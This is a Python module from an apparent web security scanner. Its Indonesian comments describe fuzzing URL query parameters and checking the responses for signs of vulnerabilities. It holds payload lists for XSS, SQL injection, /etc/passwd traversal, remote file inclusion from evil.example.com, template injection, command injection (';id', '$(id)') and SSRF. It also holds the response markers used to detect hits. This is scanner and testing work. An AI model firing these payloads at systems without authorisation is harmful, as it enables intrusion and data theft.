"""Fuzzing parameter sederhana: isi nilai berbahaya ke param umum dan pantau respons.

Fuzzer ini bersifat non-destruktif dan digunakan untuk menemukan refleksi
parameter atau anomali status (500/terkonfirmasi vuln oleh payload lain).
Versi intelligent menyesuaikan payload dengan teknologi (stack) dan tipe
parameter, plus mutation fuzzing pada nilai asli.
"""

import re
import unicodedata
from typing import List, Optional
from urllib.parse import parse_qsl, quote, urlencode, urlparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, warn
from keris.modules.scanner import Finding

# Nilai uji untuk fuzz: menangkap refleksi & error
FUZZ_VALUES = {
    "reflected": '<script>alert("keris")</script>',
    "sqli": "' OR '1'='1",
    "lfi": "../../../../etc/passwd",
    "redirect": "https://evil.example.com",
    "json": '{"__proto__": {"polluted": true}}',
}

INTERESTING_PARAMS = [
    "id", "page", "user", "username", "email", "search", "q", "query", "file",
    "path", "url", "redirect", "callback", "next", "lang", "page_id",
    "product", "item", "category", "sort", "order", "limit", "offset",
]

# ---------------------------------------------------------------------------
# Intelligent fuzzing: tipe parameter
# ---------------------------------------------------------------------------

# heuristik tipe parameter dari nama: (regex, label)
PARAM_TYPE_RULES = [
    (r"(^|_)(id|uid|pid|oid|num|no|count|limit|offset|page|index|size|qty|price|amount|total|qty|year|month|day)$", "numeric"),
    (r"(^|_)id$", "numeric"),
    (r"(path|file|dir|dir|page|lang|template|include|view|download|src|href|url|uri|link|return|redirect|next|callback|dest|goto|target)$", "path"),
    (r"(email|mail|user|username|login|account|name)$", "string"),
    (r"(search|q|query|keyword|term|s|text|comment|message|note|title|slug|name|tags|filter)$", "search"),
    (r"(sort|order|direction|asc|desc)$", "order"),
]

# label payload yang cocok untuk tipe parameter tertentu
TYPE_PAYLOAD_LABELS = {
    "numeric": ["sqli", "integer-overflow", "ssrf-num"],
    "path": ["lfi", "rfi", "path-traversal", "ssti", "cmdi", "ssrf"],
    "string": ["xss", "ssti", "cmdi", "sqli", "prototype"],
    "search": ["sqli", "xss", "ssti"],
    "order": ["sqli", "ssti", "cmdi"],
}

# payload per label: (value, marker_regex_or_none)
SMART_PAYLOADS = {
    "sqli": [("'", r"SQL syntax|mysql_|ORA-|PostgreSQL|sqlite|Syntax error"),
             ("' OR '1'='1", r"OR '1'='1"),
             ('1" AND 1=1--', r"AND 1=1")],
    "xss": [('<script>alert(1)</script>', None),
            ('"><img src=x onerror=alert(1)>', None),
            ("javascript:alert(1)", None)],
    "lfi": [("../../../../etc/passwd", r"root:x:0"),
            ("....//....//etc/passwd", r"root:x:0"),
            ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:x:0")],
    "rfi": [("https://evil.example.com/shell.txt", r"evil.example.com")],
    "path-traversal": [("../../../../etc/passwd", r"root:x:0"),
                       ("..%2f..%2f..%2fetc%2fpasswd", r"root:x:0")],
    "ssti": [("{{7*7}}", r"49"), ("${7*7}", r"49"), ("<%= 7*7 %>", r"49")],
    "cmdi": [(";id", r"uid="), ("|id", r"uid="), ("$(id)", r"uid="), ("`id`", r"uid=")],
    "ssrf": [("http://127.0.0.1", r"127\.0\.0\.1")],
    "ssrf-num": [("http://2130706433", r"2130706433")],
    "integer-overflow": [("-1", None), ("0", None), ("99999999999999999999", None),
                         ("2147483648", None), ("4294967295", None)],
    "prototype": [('{"__proto__":{"polluted":true}}', r"polluted")],
}

# Teknologi -> label payload tambahan
TECH_EXTRA_PAYLOADS = {
    "PHP": ["lfi", "cmdi", "ssti"],
    "ASP.NET": ["ssti", "sqli", "lfi"],
    "Java": ["ssti", "cmdi", "lfi"],
    "Python": ["ssti", "cmdi", "sqli"],
    "Node.js": ["prototype", "ssti", "cmdi"],
    "Next.js": ["prototype", "ssti", "cmdi"],
    "WordPress": ["lfi", "sqli", "cmdi"],
    "Laravel": ["ssti", "sqli", "lfi"],
    "Django": ["ssti", "sqli", "cmdi"],
    "Ruby on Rails": ["ssti", "cmdi", "sqli"],
    "Express": ["prototype", "ssti", "cmdi"],
    "React": [],
    "Angular": [],
    "Vue": [],
}

# ---------------------------------------------------------------------------
# Mutation fuzzing
# ---------------------------------------------------------------------------

def _mutations(seed: str) -> List[tuple]:
    """Hasilkan variasi nilai seed untuk mutation fuzzing:
    perubahan kecil yang sering memicu parser aneh (encoding, tipe, batas)."""
    out = []
    if seed:
        out.append(("truncate", seed[:-1]))
        out.append(("reverse", seed[::-1]))
        out.append(("swapcase", seed.swapcase()))
        out.append(("repeat", seed * 2))
    out += [
        ("url-encode", quote(seed)),
        ("double-encode", quote(quote(seed))),
        ("null-byte", seed + "%00"),
        ("plus", seed + "+"),
        ("quote", "'" + seed + "'"),
        ("nfc", unicodedata.normalize("NFC", seed)),
        ("nfd", unicodedata.normalize("NFD", seed)),
    ]
    return out


def _guess_param_type(name: str) -> str:
    low = name.lower().strip()
    for pattern, label in PARAM_TYPE_RULES:
        if re.search(pattern, low):
            return label
    return "string"


def _interest_score(text: str, baseline: str = "") -> int:
    """Skor indikator yang MUNCUL dari payload (dibanding baseline).

    Marker yang sudah ada di respons normal (mis. tag `<script>` halaman itu
    sendiri) TIDAK dihitung, supaya halaman HTML biasa tidak meledak menjadi
    temuan.
    """
    score = 0
    if "<script" in text and "<script" not in baseline:
        score += 3
    if "alert(" in text and "alert(" not in baseline:
        score += 3
    if "OR '1'='1" in text and "OR '1'='1" not in baseline:
        score += 2
    if "/etc/passwd" in text and "/etc/passwd" not in baseline:
        score += 2
    if "evil.example.com" in text and "evil.example.com" not in baseline:
        score += 1
    if re.search(r"SQL syntax|mysql_|ORA-|PostgreSQL|syntax error", text, re.IGNORECASE) and \
            not re.search(r"SQL syntax|mysql_|ORA-|PostgreSQL|syntax error", baseline, re.IGNORECASE):
        score += 2
    if re.search(r"Fatal error|Warning:|Uncaught", text) and \
            not re.search(r"Fatal error|Warning:|Uncaught", baseline):
        score += 1
    return score


def fuzz_parameters(base: str, client: KerisHTTP, endpoints: List[str], max_per_endpoint: int = 8) -> List[Finding]:
    """Fuzz parameter pada endpoint yang memiliki query string."""
    findings = []
    # sertakan base URL sendiri jika membawa query string
    candidates = list(endpoints)
    if "?" in base:
        candidates.append(base)
    base_clean = base.rstrip("/")
    for ep in candidates:
        full = ep if ep.startswith("http") else base_clean + ep
        if "?" not in full:
            continue
        url = urlparse(full)
        params = dict(parse_qsl(url.query))
        if not params:
            continue
        for name, orig in list(params.items())[:max_per_endpoint]:
            # baseline
            try:
                r0 = client.get(full, timeout=10)
                baseline_status = r0.status_code
                baseline_text = r0.text
            except Exception:
                baseline_status = 0
                baseline_text = ""
            for label, value in FUZZ_VALUES.items():
                new_qs = dict(params)
                new_qs[name] = value
                fuzz_url = f"{url.scheme}://{url.netloc}{url.path}?{urlencode(new_qs)}"
                try:
                    r = client.get(fuzz_url, timeout=10)
                except Exception:
                    continue
                score = _interest_score(r.text, baseline_text)
                reflected = value in r.text
                # refleksi harus benar-benar baru (nilai payload tidak ada di baseline)
                reflected = reflected and value not in baseline_text
                if reflected or score >= 3 or (r.status_code == 500 and baseline_status != 500):
                    sev = "MEDIUM" if reflected and "<script" in value else "LOW"
                    findings.append(Finding(
                        sev, "Refleksi/anomali parameter (perlu verifikasi manual)",
                        full,
                        f"Parameter `{name}` dengan payload `{label}`: status {r.status_code}, "
                        f"reflected={reflected}, interest={score}.",
                        f"payload: {value[:100]}; status: {r.status_code}",
                    ))
                    debug(f"  fuzz {name}={label} -> status {r.status_code} reflected={reflected}")
                    break  # cukup satu sinyal per parameter
    return findings


def fuzz_cmdi_ssti(base: str, client: KerisHTTP, endpoints: List[str]) -> List[Finding]:
    """Fuzz command injection & SSTI pada parameter query."""
    from keris.payloads import CMDI_PAYLOADS, CMDI_OUTPUT_MARKERS, SSTI_PAYLOADS, SSTI_MARKERS

    findings = []
    base_clean = base.rstrip("/")
    candidates = list(endpoints)
    if "?" in base:
        candidates.append(base)
    for ep in candidates:
        full = ep if ep.startswith("http") else base_clean + ep
        if "?" not in full:
            continue
        url = urlparse(full)
        params = dict(parse_qsl(url.query))
        for name in list(params.keys())[:5]:
            # baseline halaman tanpa payload untuk membedakan refleksi evaluasi
            q0 = dict(params)
            q0.pop(name, None)
            try:
                r0 = client.get(f"{url.scheme}://{url.netloc}{url.path}?{urlencode(q0)}", timeout=15)
                base_body = r0.text
            except Exception:
                base_body = ""
            # CMDI: kirim payload, cek marker output OS (uid=, root:x, dll)
            for payload in CMDI_PAYLOADS[:6]:
                new_qs = dict(params)
                new_qs[name] = payload
                try:
                    r = client.get(f"{url.scheme}://{url.netloc}{url.path}?{urlencode(new_qs)}", timeout=15)
                except Exception:
                    continue
                low = r.text.lower()
                if any(m in low for m in CMDI_OUTPUT_MARKERS):
                    findings.append(Finding(
                        "HIGH", "Kemungkinan command injection",
                        full,
                        f"Parameter `{name}` dengan payload `{payload}` merefleksikan output "
                        "perintah (uid/gid). Verifikasi manual.",
                        f"payload: {payload}",
                    ))
                    debug(f"  CMDI sinyal: {name}={payload}")
                    break
            # SSTI: cek refleksi hasil evaluasi template
            for payload in SSTI_PAYLOADS[:6]:
                new_qs = dict(params)
                new_qs[name] = payload
                try:
                    r = client.get(f"{url.scheme}://{url.netloc}{url.path}?{urlencode(new_qs)}", timeout=15)
                except Exception:
                    continue
                if "7*7" in payload:
                    # hasil evaluasi 49 yang BARU (tidak ada di baseline), payload tidak mentah
                    if "49" in r.text and "49" not in base_body and payload not in r.text:
                        findings.append(Finding(
                            "HIGH", "Kemungkinan Server-Side Template Injection (SSTI)",
                            full,
                            f"Parameter `{name}` dengan payload `{payload}` tampak dievaluasi "
                            "sebagai template (refleksi 49). Verifikasi manual.",
                            f"payload: {payload}",
                        ))
                        debug(f"  SSTI sinyal: {name}={payload}")
                        break
    return findings


def _smart_check(text: str, baseline: str, value: str, marker: Optional[str]) -> bool:
    """Cek apakah payload memicu sinyal: marker terlihat ATAU payload dievaluasi
    (tidak direfleksikan mentah). Baseline digunakan untuk mengurangi false positive."""
    if marker:
        if re.search(marker, text, re.IGNORECASE) and \
                not re.search(marker, baseline, re.IGNORECASE):
            return True
    # nilai tidak muncul mentah di respons TAPI respons berubah drastis => evaluasi
    if value not in text and value not in baseline:
        # fallback: jangan klaim tanpa bukti; hanya refleksi / marker / status 500
        return False
    return False


def fuzz_intelligent(base: str, client: KerisHTTP, endpoints: List[str],
                     max_per_endpoint: int = 8,
                     tech: Optional[str] = None) -> List[Finding]:
    """Fuzzing cerdas: pilih payload sesuai tipe parameter dan teknologi stack."""
    findings = []
    stacks = []
    if tech:
        stacks = [tech]
    else:
        try:
            r = client.get(base.rstrip("/") + "/", timeout=10)
            from keris.modules.recon import detect_stack
            stacks = detect_stack(dict(r.headers), r.text)
        except Exception:
            stacks = []

    extra_labels = set()
    for s in stacks:
        extra_labels.update(TECH_EXTRA_PAYLOADS.get(s, []))

    base_clean = base.rstrip("/")
    candidates = list(endpoints)
    if "?" in base:
        candidates.append(base)
    seen = set()
    for ep in candidates:
        full = ep if ep.startswith("http") else base_clean + ep
        if "?" not in full:
            continue
        url = urlparse(full)
        params = dict(parse_qsl(url.query))
        if not params:
            continue
        for name, orig in list(params.items())[:max_per_endpoint]:
            ptype = _guess_param_type(name)
            labels = list(TYPE_PAYLOAD_LABELS.get(ptype, ["string", "sqli", "xss"]))
            labels = list(dict.fromkeys(labels + sorted(extra_labels)))
            # baseline
            try:
                r0 = client.get(full, timeout=10)
                baseline_text = r0.text
            except Exception:
                baseline_text = ""
            for label in labels:
                for value, marker in SMART_PAYLOADS.get(label, []):
                    new_qs = dict(params)
                    new_qs[name] = value
                    fuzz_url = f"{url.scheme}://{url.netloc}{url.path}?{urlencode(new_qs)}"
                    if fuzz_url in seen:
                        continue
                    seen.add(fuzz_url)
                    try:
                        r = client.get(fuzz_url, timeout=10)
                    except Exception:
                        continue
                    reflected = value in r.text and value not in baseline_text
                    if reflected and "<script" in value:
                        findings.append(Finding(
                            "MEDIUM", "Refleksi parameter (XSS refleksi)",
                            full,
                            f"Parameter `{name}` merefleksikan payload `{label}` apa adanya. "
                            "Verifikasi manual apakah ada sanitasi.",
                            f"payload: {value[:80]}",
                        ))
                        break
                    if _smart_check(r.text, baseline_text, value, marker):
                        sev = "HIGH" if label in ("cmdi", "ssti", "lfi", "rfi", "ssrf") else "MEDIUM"
                        findings.append(Finding(
                            sev, f"Indikasi {label.upper()} (perlu verifikasi manual)",
                            full,
                            f"Parameter `{name}` tipe `{ptype}` dengan payload `{label}` "
                            f"memunculkan marker. Stack: {', '.join(stacks) or 'tidak terdeteksi'}.",
                            f"payload: {value[:80]}",
                        ))
                        debug(f"  smart {name}={label} ({ptype}) status {r.status_code}")
                        break
    return findings


def fuzz_mutate(base: str, client: KerisHTTP, endpoints: List[str],
                max_per_endpoint: int = 5) -> List[Finding]:
    """Mutation fuzzing: terapkan variasi kecil pada nilai parameter asli dan
    amati perubahan status (5xx baru) atau refleksi tak wajar."""
    findings = []
    base_clean = base.rstrip("/")
    candidates = list(endpoints)
    if "?" in base:
        candidates.append(base)
    for ep in candidates:
        full = ep if ep.startswith("http") else base_clean + ep
        if "?" not in full:
            continue
        url = urlparse(full)
        params = dict(parse_qsl(url.query))
        if not params:
            continue
        for name, orig in list(params.items())[:max_per_endpoint]:
            try:
                r0 = client.get(full, timeout=10)
                baseline_status = r0.status_code
                baseline_text = r0.text
            except Exception:
                baseline_status = 0
                baseline_text = ""
            for mut_label, mutated in _mutations(orig):
                new_qs = dict(params)
                new_qs[name] = mutated
                fuzz_url = f"{url.scheme}://{url.netloc}{url.path}?{urlencode(new_qs)}"
                try:
                    r = client.get(fuzz_url, timeout=10)
                except Exception:
                    continue
                # 5xx baru = parser/anomaly
                if r.status_code >= 500 and baseline_status < 500:
                    findings.append(Finding(
                        "MEDIUM", "Anomali status 5xx pada mutation",
                        full,
                        f"Parameter `{name}` (nilai asli `{orig[:40]}`) dengan mutasi "
                        f"`{mut_label}` menghasilkan status {r.status_code} (baseline "
                        f"{baseline_status}).",
                        f"mutation: {mutated[:80]}",
                    ))
                    debug(f"  mutate {name}={mut_label} -> {r.status_code}")
                elif mut_label == "swapcase" and orig and \
                        orig not in baseline_text and orig in r.text and \
                        r.status_code != baseline_status:
                    pass
    return findings
